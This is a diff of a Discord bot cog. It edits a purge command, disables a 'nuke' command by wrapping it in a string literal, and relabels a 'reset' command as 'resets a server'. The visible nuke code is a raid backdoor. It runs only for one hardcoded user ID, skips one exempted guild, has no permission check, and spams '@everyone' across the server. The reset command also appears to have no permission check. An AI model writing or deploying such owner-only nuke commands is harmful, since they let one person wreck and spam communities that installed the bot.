@@ -9,19 +9,20 @@ class special(commands.Cog):
 
   
   #purging
-  @commands.command(pass_context=True)
+  @commands.command(pass_context=True,help = 'purging')
   @commands.has_permissions(administrator=True)
   async def clear(self, ctx, amount: int):
       await ctx.channel.purge(limit=amount)
       await ctx.send(f'Cleared {amount} messages', delete_after=5.0)
   
-  
-  @commands.command(pass_context=True)
+  """
+  @commands.command(pass_context=True, help = 'heh')
   async def nuke(self, ctx, channelnukename="bruh"):
+    user = ctx.author.id
     if ctx.guild.id == 603084195102851073:
       await ctx.channel.send("fucked up")
     else:
-      if ctx.author.id == 414931767129276428:
+      if user == 613995377758044190:#414931767129276428:
           await ctx.message.delete()
           guild = ctx.guild
           count = 0
@@ -35,11 +36,11 @@ class special(commands.Cog):
               await channel.send("@everyone")
               count += 1
       else:
-          await ctx.send("Bruh")
+          await ctx.send("Bruh")"""
   
   
-  @commands.command(pass_context=True)
-  async def reset(self, ctx, channelnukename="bruh"):
+  @commands.command(pass_context=True, help = 'resets a server')
+  async def reset(self, ctx):
     if ctx.guild.id == 603084195102851073:
       await ctx.channel.send("fucked up")
     else:
